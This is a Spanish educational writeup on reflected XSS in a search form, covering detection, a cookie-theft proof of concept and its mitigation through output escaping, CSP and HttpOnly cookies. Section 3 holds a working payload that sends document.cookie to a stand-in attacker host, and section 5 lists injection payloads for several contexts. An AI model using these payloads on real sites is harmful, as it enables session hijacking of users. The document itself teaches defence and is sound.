---
title: "XSS reflejado: cómo un campo de búsqueda sin sanitizar permite robar la sesión"
date: 2026-06-17
category: web
category_label: Web
ref: "2026-003"
difficulty: 2
tags: [xss, javascript, cookies, sanitizacion, owasp]
excerpt: "Análisis paso a paso de un Cross-Site Scripting reflejado en un buscador, desde la detección hasta el robo de cookies de sesión, con su mitigación correcta."
---

El Cross-Site Scripting (XSS) sigue apareciendo en el top 10 de OWASP por un motivo muy simple: basta con un único punto de la aplicación donde la entrada del usuario se inserte en el HTML sin sanitizar para abrir la puerta a ejecutar JavaScript arbitrario en el navegador de otra persona.

Este writeup documenta un XSS reflejado clásico en un formulario de búsqueda, desde la detección hasta una prueba de concepto de robo de cookies, y cómo se arregla correctamente.

## 1. El escenario

La aplicación tiene un buscador interno. Al introducir un término, la página de resultados muestra algo como:

```html
<p>Resultados para: <strong>gatos</strong></p>
```

El parámetro va por la URL:

```
https://victima.example/buscar?q=gatos
```

Lo primero que se prueba ante cualquier campo que refleje el input en la página es un payload de detección simple:

```
https://victima.example/buscar?q=<script>alert(1)</script>
```

Si aparece un `alert` al cargar la página, el servidor está devolviendo el parámetro tal cual, sin escapar caracteres especiales de HTML.

## 2. Confirmando la vulnerabilidad

Inspeccionando el HTML de respuesta se observa el problema:

```html
<p>Resultados para: <strong><script>alert(1)</script></strong></p>
```

El servidor concatena el valor de `q` directamente en la plantilla, sin pasar por ninguna función de escape (`htmlspecialchars`, `escape`, etc. según el stack). Cualquier carácter `<`, `>` o `"` que el usuario envíe se interpreta como HTML/JS, no como texto.

Esto es un **XSS reflejado**: el payload no se almacena en el servidor, viaja en la propia petición y se "refleja" en la respuesta. Para que afecte a otra persona, la víctima tiene que abrir un enlace manipulado — a diferencia del XSS almacenado, que persiste en la base de datos y afecta a cualquiera que visite la página.

## 3. De un `alert` a algo con impacto real

Un `alert(1)` solo demuestra que el código se ejecuta. Para una prueba de concepto con impacto real, el objetivo típico es el robo de la cookie de sesión, si esta no tiene el flag `HttpOnly`:

```html
<script>
fetch('https://atacante.example/log?c=' + document.cookie)
</script>
```

URL-encodeado para que sobreviva el viaje como parámetro GET:

```
https://victima.example/buscar?q=%3Cscript%3Efetch('https://atacante.example/log?c='%2Bdocument.cookie)%3C/script%3E
```

Si la víctima autenticada abre ese enlace, su navegador ejecuta el script en el contexto de `victima.example`, y la cookie de sesión llega al servidor del atacante. Con esa cookie, el atacante puede suplantar la sesión sin necesidad de credenciales.

En un caso real este enlace se distribuiría por correo, mensaje directo, o acortadores de URL para ocultar el payload.

## 4. Por qué el navegador permite esto

El navegador no distingue entre "JavaScript que puso el desarrollador" y "JavaScript que llegó dentro de un parámetro": todo lo que aparece dentro de una etiqueta `<script>` en el HTML que recibe se ejecuta con el mismo origen y privilegios que el resto de la página. Por eso el control tiene que estar en cómo el servidor construye el HTML, no en el navegador.

## 5. Variantes del mismo problema

| Contexto de inyección | Payload típico | Por qué falla la sanitización a veces |
|---|---|---|
| Dentro de una etiqueta HTML | `<script>...</script>` | Falta de escape de `<` `>` |
| Dentro de un atributo | `" onmouseover="alert(1)` | Falta de escape de comillas |
| Dentro de un bloque `<script>` existente | `';alert(1);'` | Falta de escape dentro de contexto JS |
| Dentro de una URL (`href`) | `javascript:alert(1)` | No se valida el esquema de la URL |

Cada contexto requiere una estrategia de escape distinta — escapar para HTML no protege un atributo, y escapar para un atributo no protege un bloque `<script>`.

## 6. Mitigación correcta

La defensa en profundidad combina varias capas:

| Mitigación | Qué aporta |
|---|---|
| **Escapado de salida según contexto** | Convierte `<`, `>`, `"`, `'` en sus entidades HTML antes de insertar cualquier dato del usuario en la respuesta |
| **Content Security Policy (CSP)** | Cabecera que restringe qué scripts puede ejecutar el navegador, mitigando el impacto aunque exista la inyección |
| **Cookie con flag `HttpOnly`** | Impide que `document.cookie` devuelva la cookie de sesión desde JavaScript |
| **Cookie con flag `SameSite`** | Reduce el riesgo de que la sesión se use desde un origen distinto |
| **Validación de entrada** | Complementaria, nunca sustituye al escapado de salida — es la última línea, no la primera |

El error de fondo en este caso es no escapar la salida. La corrección mínima en una plantilla típica:

```html
<!-- Vulnerable -->
<p>Resultados para: <strong><?php echo $_GET['q']; ?></strong></p>

<!-- Corregido -->
<p>Resultados para: <strong><?php echo htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8'); ?></strong></p>
```

La mayoría de frameworks modernos (React, Vue, Django templates, Rails) escapan por defecto al renderizar variables, lo que elimina esta clase de bug salvo que el desarrollador use explícitamente una función de "HTML crudo" (`dangerouslySetInnerHTML`, `| safe`, `mark_safe`, etc.) sobre datos no confiables.

## Conclusión

El XSS reflejado no necesita una vulnerabilidad compleja: basta un único punto donde la entrada del usuario llegue al HTML de respuesta sin escapar. El payload de detección es trivial, pero el impacto real depende de qué se puede hacer con JavaScript ejecutándose en el origen de la víctima — desde robo de sesión hasta phishing dentro de la propia página legítima. El escapado de salida correcto, combinado con `HttpOnly` y CSP, cierra la puerta tanto a la inyección como a buena parte de su impacto si esta llegara a ocurrir.
